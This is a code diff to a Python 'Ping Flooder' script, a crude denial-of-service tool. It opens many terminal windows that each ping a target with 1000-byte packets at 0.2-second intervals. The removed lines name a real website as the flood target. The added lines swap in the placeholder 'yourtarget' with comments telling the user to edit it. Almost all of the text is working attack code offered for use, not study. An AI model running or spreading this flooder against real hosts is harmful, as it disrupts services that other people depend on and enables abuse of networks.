@@ -52,7 +52,7 @@ if platform.system()== 'Windows':
 	print("Ping Flooder running on Windows")
 	print("Windows platform is currently unstable, expect errors...", '\n')
 power = "Power (1-50): "
-target = input(Fore.YELLOW + "Current target: www.sfgames.ru") #edit this line with you current target
+target = input(Fore.YELLOW + "Current target: yourtarget") #edit this line with you current target
 time.sleep(2)
 
 ###fun###
@@ -61,11 +61,11 @@ def start():
 	if platform.system()== 'Linux':
 		
 		for k in range(x):
-			os.system("lxterminal -e ping www.sfgames.ru -i 0.2 -s 1000") #edit this line for changing target
+			os.system("lxterminal -e ping yourtarget -i 0.2 -s 1000") #edit this line for changing target
 	if platform.system()== 'Windows':
 		for k in range(x):
 			
-			os.system("cmd ping www.sfgames.ru")
+			os.system("cmd ping yourtarget")
 			
 	for k in range(1000000000):
 		print(Fore.GREEN + "[*] Sending 1000 bytes packets...", '\n')
